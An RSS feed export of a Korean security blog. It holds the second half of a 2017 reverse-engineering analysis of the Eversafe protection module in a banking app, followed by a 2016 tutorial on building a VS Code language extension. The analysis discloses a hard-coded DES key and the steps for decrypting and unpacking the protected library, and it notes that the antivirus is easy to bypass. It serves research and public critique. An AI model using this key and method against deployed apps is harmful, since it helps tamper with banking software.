<p>libeversafe.so를 더 살펴보면 위와 같이 특정 jar파일을 <strong><em>DexClassLoader</em></strong> 클래스의 <strong><em>loadClass</em></strong>를 사용해서 동적으로 로드한다는 것을 알 수 있다. 이정도로 파악을 하고, 실제 기기에서 해당 파일들을 찾아보기로 하자. 아래의 <em>&#8220;%s/.eversafe-%s&#8221;</em>라는 스트링이 파일 시스템 내에 hidden directory로 존재한다는 힌트를 주고 있다.</p>
<p><img class="aligncenter wp-image-2286" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_11.png" alt="" width="652" height="129" /></p>
<p>&nbsp;</p>
<h2>위기</h2>
<p>우선, 아직 살펴보지 않은 용량이 1.14MB로 다른것들에 비해 꽤나 큰 native library인 <strong>libeversafe-loader.so</strong>를 살펴보려고 했지만, 다음과 같은 에러를 볼 수 있었다.</p>
<p><img class="aligncenter size-full wp-image-2288" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_12.png" alt="" width="491" height="209" /></p>
<p>보통 ELF 헤더가 corrupt되었을 때 뜨는 에러인데, 그래서 의아한 채로 헥스 에디터로 열어서 확인해 보았다.</p>
<p><img class="aligncenter size-full wp-image-2289" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_13.png" alt="" width="683" height="545" /></p>
<p>보다시피 처음 16바이트 정도의 헤더만 빼고는 뭔가 랜덤해 보이는 데이터들이 가득 차있다. 바이트 별 히스토그램을 추출해봐도 전반적으로 골고루 분포된 것을 발견할 수 있는데, 이런 경우는 보통 압축이 되어있거나 암호화가 되어있을 때다. 그렇다. 용량도 큰 것이 조금 중요해 보인다 싶었던 libeversafe-loader.so 녀석은 암호화가 되어있었다. 위 스크린샷에서는 안보이지만 NULL-byte가 많이 포함된 부분에서는 동일한 &#8220;패턴&#8221;이 있었는데, 이런 경우는 ECB모드로 암호화를 했을 확률이 크다.</p>
<p>일단 그럼 넘어가기로 하고&#8230; 실제 기기에서 단서를 찾아보자!</p>
<p><img class="aligncenter size-full wp-image-2290" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_14.png" alt="" width="593" height="223" /></p>
<p>예상했던대로 우리은행 앱의 데이터 캐시 디렉토리에 <em>.eversafe-{ANDROID_ID}</em> 디렉토리가 존재한다. 하지만 안을 들여다봤지만 아무것도 찾을 수 없었다고 한다 ㅠㅠ</p>
<p>또 시스템에서 얻을 수 있는 단서로는 현재 실행되고 있는 앱의 메모리 맵이 있는데, 특히 <strong><em>loadLibrary</em></strong>나 <em><strong>DexClassLoader</strong></em> 등으로 동적 로딩이 된 녀석들을 발견할 수 있다.</p>
<p><img class="aligncenter wp-image-2291" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_15.png" alt="" width="1039" height="256" /></p>
<p>보다시피 우리가 좀전에 확인했던 디렉토리에 존재했던 파일들을 로드해둔 흔적이 보인다. 각 파일 이름 옆에 (deleted) 라고 뜬 것이 마치 놀리는것 같다. 이대로 끝인건가!</p>
<p>&nbsp;</p>
<h2>절정</h2>
<p>당연히 아니다. 후후. 우리가 누구인가. 한 번 물으면 끝을 봐야하는 끈기있는 해커니까 더 분석해보도록 한다.</p>
<p>우선 클라우드에서 그때그때 필요한 모듈 (위 스크린샷에서의 UUID로 된 파일과 dex 파일)들을 받아온다는 가정하에 Man-in-the-Middle (MitM; 중간자 공격)을 시도했다.</p>
<p><img class="aligncenter wp-image-2297" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_16-1.png" alt="" width="725" height="639" /></p>
<p>어라? 우리가 앞서 봤듯이 <em>https://appsec.wooribank.com:4443/eversafe/6d7d2a5a-d288-e9fa-b6fe-94185e611030/auth</em>에 리퀘스트를 보내긴 하지만, 서버는 503 에러를 보내올 뿐이다..  열심히 내 폰의 정보를 던져주었는데도 서비스를 하지 않는다니!! 아주 건방진 서버다. 그리고 이후에도 계속된 /auth 리퀘스트의 실패만 나타날 뿐 모듈을 다운받거나 하는 정황을 포착할 수 없었다.</p>
<p>혼란에 빠진 나는 다시 코드를 읽기로 마음을 먹었고, 오래 걸리지 않아 동적 로딩된 파일이 어떻게 마법처럼 파일시스템에 생겼다가 사라지는지 알아냈다.</p>
<p>내가 혼란에 빠진 이유는 &#8220;클라우드에서 매번 다른 모듈을 받아오겠지&#8221;라는 아주 정상적이지만(?) 잘못된 가정을 세우고 있었기 때문이다. 적어도 우리은행 앱에 적용된 Eversafe는 서버와 전혀 교류없이 자체적으로 해당 파일들을 &#8220;만들어&#8221;낸다. (네?)</p>
<p><img class="aligncenter size-full wp-image-2298" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_17.png" alt="" width="505" height="452" /></p>
<p>코드가 아름다운 이유는, 코드는 절대 거짓말을 하지 않기 때문이다. 이전에 읽다가 간과한 부분이었던 위의 코드를 보자.</p>
<p>이 코드와 앞서 봤던 메모리 맵에 나온 파일명들을 보면 무슨일이 있었는지 유추가 가능해진다. 어떤 jar파일의 경로를 만들어내고 있는데, 그 인자로 <strong><em>gettimeofday</em></strong>의 결과값이 사용된다. 정확히는 <em>tv_sec</em>과 <em>tv_usec</em>의 값을 헥스로 표기한 값이 합쳐진 문자열을 파일명으로 사용하는데, 앞서 본 파일명을 예제로 들어보면 <strong>59870969</strong><span style="text-decoration: underline;">17940</span> 에서 <em>tv_sec</em>에 해당하는 0x59870969는 UTC로 2017년 8월 6일 12시 19분 53초를 나타내고 <em>tv_usec</em>에 해당하는 0x17940은  96575 마이크로 초를 나타낸다. 지금 글을 쓰는게 8월 7일이니까 대충 맞아 떨어진다. 즉, 파일이 생성된 시간으로 jar 파일명을 만든다는 것이다.</p>
<p>그러면 더 중요한 질문은.. 여기서 만들어지는 jar 파일은 어디에서 내용을 가져오는가 이다. 답은 역시 이 바이너리안에 있었다.</p>
<p><img class="aligncenter wp-image-2299" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_18.png" alt="" width="480" height="390" /></p>
<p>위의 코드는 .data 섹션에 embed 되어있는 jar 파일 내용을 읽어와서 방금 만든 파일 경로에 쓴 다음, <strong><em>DexClassLoader</em></strong>를 이용하여 로딩하고 (이 과정에서 메모리 맵에서 본 것 처럼 하위폴더와 dex파일이 생성된다), 해당 파일들을 파일시스템에서 지워버린다 (unlink). 즉, 이 말은 해당 jar파일은 매번 static 하다는 말이다 &#8212; 파일명만 달라질뿐&#8230;</p>
<p>자, 새로운 파일을 GET 했으니 들뜬 마음으로 열어보자!</p>
<div id="attachment_2300" style="width: 329px" class="wp-caption aligncenter"><img class="wp-image-2300 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_19.png" alt="" width="319" height="315" /><p class="wp-caption-text">네? 이게 전부라구요?</p></div>
<p>뭔가.. 또 많이 없어보인다. 이전에 보이지 않던 antivirus 관련 클래스들이 조금 추가 되었지만, 사실상 로직은 안들어있는것 같다. 눈에 띄는것은 <strong><em>HttpClient</em></strong> 클래스와 <strong><em>Crypto</em></strong> 클래스다. 하지만 따로 HTTP 통신은 딱히 하지 않는다는것을 이전 실험을 통해 알았으므로,  <strong><em>HttpClient</em></strong>는 그다지 흥미롭지 않으나 <strong><em>Crypto</em></strong>는 필시 libeversafe-loader.so의 복호화를 하는데 사용될 것이다!</p>
<p><img class="aligncenter size-full wp-image-2302" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_20.png" alt="" width="869" height="357" /></p>
<p>위는 새롭게 추출한 jar 파일의 <strong><em>Eversafe</em></strong> 클래스의 <strong><em>loadJni</em></strong> 메소드다. 하는일은 매우 단순한데,  <em>lib/</em> 디렉토리에 있는<em> libeversafe-loader.so</em> 파일을 열고,  <em>cache/</em><em>.eversafe-{ANDROID_ID}/{PID}/{RANDOM_UUID}</em> 파일 경로를 만들어낸 후, 암호화되어 있는 loader.so를 랜덤 UUID 파일에 복호화한다. 복호화가 끝난 후에는 <strong><em>System.load</em></strong>를 통하여 해당 라이브러리를 동적 로드한다. 마지막으로, 해당 파일 및 관련된 디렉토리를 삭제한다.</p>
<p><img class="aligncenter size-full wp-image-2303" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_21.png" alt="" width="563" height="143" /></p>
<p>복호화 코드는 더더욱 간단하다. DES 알고리즘을 사용하며, 앞서 우리가 예측했던대로 ECB모드를 통해 암/복호화 하고 패딩은 PKCS5을 사용한다. DES는 symmetric 암호 알고리즘이기 때문에 고정키를 사용한다. 위에서 보는바와 같이 &#8220;0E329232EA6D0D73&#8243;가 암호키다. 다만, 파일 그자체를 통째로 복호화하면 안되고, 앞에 있는 fake ELF헤더인 16바이트를 제거해준 후 복호화 하면 된다.</p>
<p><script src="https://gist.github.com/brianairb/34cd50bfb44c68ef562136ea9ae2b48e.js"></script></p>
<p>위와 같은 간단한 스크립트로 복호화가 가능하다.</p>
<p>이제 모든 미스테리(?)가 풀렸다. 정리해보면 Eversafe의 전체적인 동적 로딩 플로우는 다음과 같다.</p>
<blockquote><p>우리은행 앱 시작 =&gt; libeversafe.so 로드 =&gt; library에 임베드 된 jar 파일 생성 및 로드 =&gt; libeversafe-loader.so 복호화 및 로드</p></blockquote>
<p>&nbsp;</p>
<p>마지막으로 얻은 아이템인 &#8220;복호화 된 libeversafe-loader.so&#8221;는 사실상 libeversafe.so의 상위집합 개념으로 볼 수 있다. 대신, OpenSSL library 등이 static link 되어있는 등 규모는 앞서 말한대로 훨씬 크다. 실제로 네트워크 주소 스크랩핑이라던가 루팅된 폰 감지 기능 등이 구현되어 있다.</p>
<div id="attachment_2304" style="width: 853px" class="wp-caption aligncenter"><img class="wp-image-2304 size-full" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_22.png" alt="" width="843" height="380" /><p class="wp-caption-text">모든 루팅 &#8220;공격&#8221;에 100% 방어했다!!!</p></div>
<p>&nbsp;</p>
<h2>결말</h2>
<p>이번 분석 결과는 개인적으로는 매우 실망적이었다. 뭔가 동적으로 로딩되고 보안모듈도 매번 새롭게 컴파일 되거나 하는 fancy한 기술이 사용될 줄 알았는데 그런 기술은 단 어디에도 찾아볼 수 없었다. 실제로 안드로이드 앱에 물려서 문제를 일으키지 않고 &#8220;기생하며 작동하는&#8221;걸 하기 위한 코드가 70% 정도 되는거 같고, 에러 처리라던가 로깅하는 코드가 20% 정도.. 나머지 실제로 보안에 1이라도 관련이 있는 부분은 정말 5%도 안된다는 생각이다.</p>
<p>웹사이트나 기사에서 언급했던 5-10분 주기마다 바뀐다는 말도 (내가 실험을 어떻게 잘못한건지도 모르겠지만) 3시간 이상 침착하게 기다렸음에도 불구하고 전혀 바뀌지 않고 그대로였다.</p>
<p><img class="aligncenter size-full wp-image-2305" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_23.png" alt="" width="1206" height="583" /></p>
<p>Eversafe의 &#8220;antivirus&#8221;에서 하는 백신 기능을 우회하는것은 솔직히 helloworld 프로그램을 작성하는거보다 쉽고 (실제로 악성행위를 하는 프로그램을 Eversafe가 체크하지 않는 경로 등에 두었더니 전혀 문제없이 돌아갔다), 기사에서 말하는 몇 천번의 테스트를 도대체 어떤걸 상대로 어떤 공격을 한건지 감도 안온다 &#8212; 너무 기능이 없어서;;</p>
<p>페이스북 원글의 댓글에서도 언급했지만, 여기서 당사자들이 말하는 &#8220;N번 테스트에서 100% 통과&#8221;라는 말은 정확히 어떻게 테스트 했냐에 따라서 의미가 있을 수도 또는 아예 0일 수도 있다. 학계 논문을 쓸 때 하는 실험에서 많이들 (반고의적으로) 실수하는 부분이기도 한데, 현재 모델과는 호환되지 않는 방향으로 바꾸었다면 테스팅 기법이나 접근도 달라져야하는 것이 당연지사지만 방어 모델은 바꾸었음에도 공격/위협 모델은 전혀 손대지 않고 &#8220;더이상 공격이 통하지 않으므로 완전히 안전하다&#8221; 라는 식의 주장을 하는 사람들이 있다.</p>
<p>시스템 해킹을 하는 사람들에게 좀더 직관적으로 이 문제를 설명하면, 마치 &#8220;ASLR을 적용했더니 메모리 코럽션 익스플로잇으로부터 100% 안전해졌습니다!&#8221; 라고 하는것과 마찬가지라는 거다. 그래서 해당 방어기법의 등장으로 메모리 코럽션 익스플로잇이 불가능해졌을까? 아니다. 그에 따라 공격자도 &#8220;진화&#8221;를 했고, 이건 그나마 챌린징하기라도 하지.. 우리가 좀전까지 함께 본 이 솔루션은 껍데기만 있을 뿐 하는게 없는 CS 전공 학부생 2학년 안드로이드 프로젝트에 버금가는 결과물이다.  (..너무 심했나) 초반에 말했듯이 수시로 동적으로 타겟을 바꾸어 공격이 어렵게 하는 것은 좋은 아이디어다. 다만, 이 컨셉을 사용하고 구현한것이 &#8220;세계 최초&#8221;는 절대 아니고 지금 Eversafe의 구현체가 실제로 보안에 도움이 되는건 더더욱 아니니 그렇게 과장하지는 않았으면 한다.</p>
<p>&nbsp;</p>
<p>이쯤 되면, 우리은행이나 정부기관이 얼마를 주고 이 원더풀한 솔루션을 사용하는지 궁금해진다. 이 솔루션을 평가하고 심사한 (그리고 투자까지 이르게 한) 심사위원들은 뭘 평가한건지도 궁금하고. 내가 모르는 사연들이 많겠지만, 보안 스타트업을 하는 1인으로서 소위 &#8220;약장수&#8221; 느낌이 나는 제품들을 곱게 포장해서 사람들을 현혹하고 이 시장을 흩트리는 사건을 그냥 보고 넘어가기에는 너무 자극적인 단어들을 써가며 마케팅을 했다.</p>
<p>&nbsp;</p>
<p>어쩌면 그게 보안 회사로서 쉽게 투자 받는 지름길이려나. 생각이 많아지는 밤이다. (라고 간지나게 쓰고 자야겠지만, 이제 본업 밀린것좀 해야지.. #스타트업라이프)</p>
<p>&nbsp;</p>
<p>====================================== (2017/08/08 14:23 PM KST)</p>
<p>본문에서 언급된 &#8220;우리은행&#8221;은 이번 분석의 초점이었던 Eversafe 솔루션을 앱에 적용했다는 것 말고는 연관된 것이 없습니다. 이번 글은 우리은행 앱 자체에 대한 보안 문제나 취약점을 다루고 있지 않으며, 단지 해당 솔루션이 적용되었다는 소개가 기사내용에 있어 선택되었습니다. 모쪼록 이번 분석내용과는 관련이 없는 우리은행에게 불필요한 비난이나 우려는 없길 바랍니다. 원본에서 이 사항에 대해서 확실히 짚고 넘어가지 못한 점에 대해 사과드립니다.</p>
<p>====================================== (2017/08/08 14:10 PM KST)</p>
<p>본 글을 링크한 <a href="https://www.facebook.com/brianairb/posts/10210300984944608" target="_blank" rel="noopener">제 페이스북 포스팅</a>에 에버스핀 사의 입장이 담겨 현재까지의 대화를 스크랩합니다. 실시간으로 확인하실 분들은 링크를 타고 보시면 됩니다. 제가 분석한 타겟은 글쓴 시점 최신 버전에 대한 분석이었으나, 은행사의 사정으로 인해 다이나믹 요소가 꺼져있다는 설명입니다. 더 자세한 설명은 오해를 일으킬 수 있으니, 원문을 게재합니다.</p>
<p><img class="aligncenter size-full wp-image-2310" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_3333.png" alt="" width="499" height="2145" /></p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2017/08/%ec%9a%b0%eb%a6%ac%ec%9d%80%ed%96%89-eversafe-null/feed/</wfw:commentRss>
		<slash:comments>16</slash:comments>
		</item>
		<item>
		<title>[Nox] 스크립트 언어 설계 및 컴파일러 만들기 + α (3)</title>
		<link>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-3/</link>
		<comments>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-3/#respond</comments>
		<pubDate>Wed, 31 Aug 2016 21:26:24 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Computer in General]]></category>
		<category><![CDATA[Computer in General/Linux]]></category>
		<category><![CDATA[Computer in General/Windows]]></category>
		<category><![CDATA[Hacking/PPP]]></category>
		<category><![CDATA[Hacking/Tools]]></category>
		<category><![CDATA[extension]]></category>
		<category><![CDATA[language server]]></category>
		<category><![CDATA[nox script]]></category>
		<category><![CDATA[visual studio code]]></category>
		<category><![CDATA[vscode]]></category>
		<category><![CDATA[에디터]]></category>
		<category><![CDATA[익스텐션]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=2160</guid>
		<description><![CDATA[스크립트 언어도 만들었고 그 언어로 작성된 소스코드를 파싱하고 컴파일도 할 수 있게 되었으니, 이제 개발 환경을 만들 차례다! 요즘에는 sublime이나 atom 같은 확장 가능한 에디터가 꽤 많기 때문에 어떤 것으로 고를지 결정하는 것도 고민이었다.&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>스크립트 언어도 <a href="https://www.bpak.org/blog/2016/08/nox-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%EC%96%B8%EC%96%B4-%EC%84%A4%EA%B3%84-%EB%B0%8F-%EC%BB%B4%ED%8C%8C%EC%9D%BC%EB%9F%AC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%CE%B1-1/" title="">만들었고</a> 그 언어로 작성된 소스코드를 <a href="https://www.bpak.org/blog/2016/08/nox-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%EC%96%B8%EC%96%B4-%EC%84%A4%EA%B3%84-%EB%B0%8F-%EC%BB%B4%ED%8C%8C%EC%9D%BC%EB%9F%AC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%CE%B1-2/" title="">파싱하고 컴파일</a>도 할 수 있게 되었으니, 이제 개발 환경을 만들 차례다! 요즘에는 sublime이나 atom 같은 확장 가능한 에디터가 꽤 많기 때문에 어떤 것으로 고를지 결정하는 것도 고민이었다. 그러던 중 얼핏 Visual Studio Code (vscode)에서 <a href="https://code.visualstudio.com/docs/extensions/example-language-server" target="_blank" title="">language server</a>라는걸 사용하면 에디터에 다소 어렵지 않게 새로운 언어의 지원을 추가 가능하다고 본 기억이 나서 vscode로 결정했다. 하지만, 작업하다 보니 생각보다 새로운(?) 기능이라 그런지 예제나 documentation을 찾을 수 없어서 꽤 고생했다 :(</p>
<div id="attachment_2162" style="width: 760px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/home-screenshot-win-lg.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-2162 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/home-screenshot-win-lg.png" alt="home-screenshot-win-lg" width="750" height="446" /></a><p class="wp-caption-text">Visual Studio Code</p></div>
<p>일단 인터페이스 깔끔하고, 쉬운 extension 관리와 Linux/Windows/macOS에서 모두 돌아가는 cross-platform. 그리고 오픈소스라는 점이 장점이다. 디버깅과 git 서포트 등의 기능도 지원하지만 우리는 딱히 필요 없다. vscode의 익스텐션은 보통 javscript나 typescript로 작성된다.</p>
<h2>VSCode Language Extension</h2>
<p>Language server는 에디터 프로세스에서 처리하기에 오래 걸리거나 외부 프로그램 등을 참조해야할 때 유용하다. 프로토콜에 대한 설명은 <a href="https://github.com/Microsoft/language-server-protocol" target="_blank" title="">github</a>을 통해 볼 수 있다. 사실 우리는 그렇게까지 복잡한 작업을 하는게 아니므로 굳이 이 방법을 안써도 되지만, 이 패러다임(?)이 MS에서 앞으로 추천하는 방법인것 같으니 시도해보도록 한다. 아주 간단한 <a href="https://github.com/Microsoft/vscode-languageserver-node-example" target="_blank" title="">boilerplate 프로젝트</a>가 있으니 clone해서 사용하면 편하다.</p>
<p>Language server를 사용한 vscode의 언어 지원 익스텐션은 크게 client와 server, 두 component로 나뉜다. Client에서는 익스텐션의 커스텀 커맨드나 설정 관리, syntax highlighting 등을 담당하고, server에서는 IntellisSense를 위한 작업을 담당한다. 또한,  Client와 server 간에 통신을 하며 클라이언트에서 특정 이벤트 발생 시에 서버에 전달하고 결과를 받아 처리한다.</p>
<h4>Client</h4>
<p>클라이언트에서는 두 가지를 처리한다: Syntax highlighting, Compile 커맨드.</p>
<p>우선, extension을 패키징 할 때 쓰이는 설정 파일인 <em>package.json</em>을 알맞게 수정해준다. 여기서 중요한 것은 <em>activationEvents</em>에서 <em>onLanguage:ns</em>를 통해 <em>ns</em> 언어로 된 파일을 열었을 경우에 익스텐션이 활성화 되도록 설정하고, 그 아래 <em>contributes</em> 옵션에 <em>languages</em>에 이 익스텐션이 이해하는 언어를 추가해준다 &#8212; 여기서 id는 이전의 onLanguage에 사용된것과 일치해야하고, <em>extensions</em> 옵션을 통해 특정 확장자 파일을 열 경우 이 언어로 이해하라고 설정 가능하다.</p>
<p>이 설정 파일에서 참조되는 <em>language-configuration.json</em>은 에디터에서 코드 접기 기능이나 자동 따옴표/괄호 완성 (여는 괄호를 쳤을때 닫는 괄호도 자동으로 만들어주는 것)을 위한 설정이다. 이건 뭐 기존 언어들과 크게 다를게 없으므로 C 언어용을 그대로 가져다 쓴다.</p>
<p><script src="https://gist.github.com/brianairb/35833f45542f18642783da52b46e74f0.js"></script></p>
<h5>Syntax Highlighting</h5>
<p>신택스 하이라이팅 지원은 따로 코딩할 필요가 없다. <strong>syntaxes</strong> 폴더 안에 <em>noxscript.tmLanguage</em>와 같은 textmate language 파일을 넣어주고 <em>package.json</em>에 위와 같이 grammar를 추가해주면 된다.</p>
<p><a href="https://manual.macromates.com/en/language_grammars" target="_blank" title="">tmLanguage </a>파일은 plist 형식으로 작성된 언어의 문법 매칭 룰 (match)과 그에 해당하는 이름 (name)을 정의한다. Sublime, TextMate, VSCode 모두 이렇게 정의한 syntax 룰을 통해 highlighting 할 수 있다. 우리는 C-like 언어이므로 C를 위해 작성된 tmLanguage 파일을 조금 변형하여 사용한다 (keyword 및 built-in 함수명들 추가 / 필요 없는 매칭 룰들 삭제): <a href="https://gist.github.com/brianairb/e1bbdf9dcd1cfc16ba1224fc2abd1e9e" target="_blank" title="">noxscript.tmLanguage</a></p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/syntax_highlight.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2169" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/syntax_highlight.png" alt="syntax_highlight" width="748" height="611" /></a></p>
<h5>Compile Command</h5>
<p>에디터에서 스크립팅을 하고 저장된 파일을 가지고 이전에 만든 컴파일러를 손수 돌려서 컴파일 해도 되지만, 에디터 내에서 바로 컴파일러를 돌려서 결과를 볼 수 있다면 편하지 않을까 싶어서 compiler integration을 넣어봤다. 이를 하기 위해서는 클라이언트 사이드에서 새로운 &#8220;command&#8221;를 만들어서 등록해주어야 한다.</p>
<p>익스텐션이 활성화되면 실행되는 <strong>activate</strong>이라는 함수를 구현해주어야 하는데, 여기서 language server와의 커넥션도 초기화해주고 컴파일하는 커맨드도 등록해주면 된다.</p>
<p><script src="https://gist.github.com/brianairb/da716c934e1ff19b58db3c4705aa3d77.js"></script></p>
<p><em>package.json</em>에서 &#8220;ns.compile&#8221; 커맨드에 대한 키 바인딩을 <strong>F5</strong>로 지정해놨는데, 이 커맨드가 실행되면 <em>registerTextEditorCommand</em>에서 등록된 커맨드 콜백 함수가 호출된다. 우리 같은 경우엔 nsc (<strong>n</strong>ox <strong>s</strong>cript <strong>c</strong>ompiler) 실행을 하는 함수인 <em>runNsc</em>를 호출한다. 이 함수에서는 <em>./bin</em> 폴더에 넣어둔 컴파일러 (윈도우에서는 nsc.exe, 리눅스에서는 nsc.linux)를 알맞은 인자를 주고 실행하고 출력 결과를 vscode 내의 아웃풋 채널에다가 출력해준다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/output_compile.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2176" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/output_compile.png" alt="output_compile" width="748" height="611" /></a></p>
<p>(내가 정성들여 컬러코딩한 아웃풋은 안나오지만 ㅜㅜ 그래도 이제 컴파일 하고 싶을때마다 F5를 뙇 눌러주면 바로 아래에 저렇게 컴파일 결과를 보여준다. 컴파일 에러 또한 나타난다.)</p>
<h4>Server</h4>
<p>이제 좀 더 흥미로운 서버사이드를 봐 보자. 서버에서 지원해야할 것은 크게 세 가지이다: Auto-completion, Signature help, Hover info.</p>
<ul>
<li>Auto-completion: 프로그래머가 소스코드 내에 존재하는 함수명이나 built-in 함수명을 치기 시작하면 해당 글자들을 가지고 있는 함수명들을 보여주고 tab을 눌러 자동완성을 할 수 있게 해주는 기능이다. Built-in 함수인 경우에는 함수 reference에 적힌대로 함수의 설명과 함수의 signature를 보여준다.<br />
<a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/autocomplete.png" data-rel="lightbox-image-3" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2179" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/autocomplete.png" alt="autocomplete" width="451" height="226" /></a></li>
<li>Signature help: 특정 함수를 호출하는 코드 작성 시, 그 함수의 signature, 즉 리턴 타입 및 인자 이름과 타입 등을 보여준다. Built-in 함수인 경우에는 현재 작성하는 인자 값을 하이라이팅 해주고 해당 인자에 대한 설명 및 타입을 보여준다.<br />
<a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/signature_help.png" data-rel="lightbox-image-4" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter size-full wp-image-2181" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/signature_help.png" alt="signature_help" width="691" height="99" /></a></li>
<li>Hoever info: 코드 내의 함수 이름 위에 커서를 올려놓으면 해당 함수의 signature를 보여준다.<br />
<a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/hover.png" data-rel="lightbox-image-5" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter size-full wp-image-2183" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/hover.png" alt="hover" width="604" height="125" /></a></li>
</ul>
<p>&nbsp;</p>
<p>익스텐션의 서버 사이드에서는 현재 작업중인 문서들을 담고 있는 <strong>TextDocuments</strong> 오브젝트의 <em>listen</em> 메소드를 통해 클라이언트/서버의 통신을 위한 IPC 커넥션을 등록한다.</p>
<p><script src="https://gist.github.com/brianairb/930e741593433b6b64603d59a6a6d1d1.js"></script></p>
<p>서버가 시작된 후, 클라이언트가 처음 접속할 때 initialize 리퀘스트를 날려서 현재 에디터의 루트 경로와 클라이언트에서 제공하는 capabilities가 뭔지 알려준다. 이 리퀘스트는 IPC 커넥션 오브젝트의 <em>onInitialize</em> 함수를 구현해서 처리할 수 있다. 서버는 이 요청에 대한 응답으로 서버에서 제공하는 capabilities를 알려준다. 우리 같은 경우에는 FULL 싱크 옵션, 코드 컴플리션 제공, signature help 제공, 그리고 마지막으로 hover를 제공한다고 알려준다.</p>
<p><script src="https://gist.github.com/brianairb/b1fd76e5129fb1ac365dc63c95aa80d7.js"></script></p>
<p>여기서 <em>triggerCharacters</em>는 프로그래머가 함수를 호출하는 코드를 작성중인 경우에 여기에서 정의된 문자를 칠 때 마다 signature helper가 트리거 되야한다고 알려주는 것이다. 함수 호출은 &#8216;(&#8216;로 시작하고, 각 인자는 &#8216;,&#8217;로 구분되기 때문에 그때 그때 signature를 업데이트 해야하는지 확인해서 클라이언트에게 알려주어야 한다.</p>
<p>Built-in 함수들에 대한 정보는 곳곳에서 쓰이기 때문에 따로 미리 전처리를 해서 보관하고 있는다. 그러기 위해서 이전 글에서 소개했던 <em>builtins.h</em> 파일을 doxygen을 사용해서 xml 파일을 생성하고 만들어진 xml 파일을 간단한 <a href="https://gist.github.com/brianairb/e68b013d515f24152b0c5c74de74eeaa" target="_blank">스크립트</a>를 통해 json 형태로 추출한다 (<em>builtins_json</em>).</p>
<h5>Auto-completion</h5>
<p>자동완성 기능은 <em>onCompletion</em> 핸들러를 구현하면 된다. 클라이언트는 현재 커서의 포지션을 Completion 리퀘스트를 통해 보내고, 서버는 completion 목록에 떠야할 아이템 목록을 리턴하면 된다. 우리가 지원해야할 함수 목록은 built-in 함수들과 프로그래머가 만들어 둔 user-defined 함수들이다. Built-in 함수는 위에서 추출해둔 <em>builtins_json</em>을 사용하면 되기 때문에 미리 만들어 둘 수 있지만, user-defined 함수들은 그때그때 사라질 수도 있고 미리 signature를 가지고 있는게 아니기 때문에 소스코드에서 따로 파싱을 해서 가져와야한다.</p>
<p><script src="https://gist.github.com/brianairb/aa5975a05ddbd319d2c4e56b0a1cedd3.js"></script></p>
<p>또한, Nox Script 3.0의 키워드들을 자동 완성 리스트에 포함시켰다.</p>
<h5>Signature Help</h5>
<p>시그니쳐 도움말 기능은 <em>onSignatureHelp</em> 핸들러를 구현하면 된다. Completion request와 마찬가지로 클라이언트는 현재 커서의 포지션을 보내고, 서버는 현재 커서의 위치에 따라 알맞은 도움말을 보여주면 된다. 프로그래머가 인자를 넣을 때 마다 알맞은 인자 하이라이팅과 도움말 (타입 정보 및 documentation)을 보여준다. 예를 들어, 위의 스크린샷에서처럼 받는 인자가 3개인 함수 호출을 하는데 두번째 인자 작성 시에는 &#8220;float x&#8221;에 해당하는 정보를 보여준다.</p>
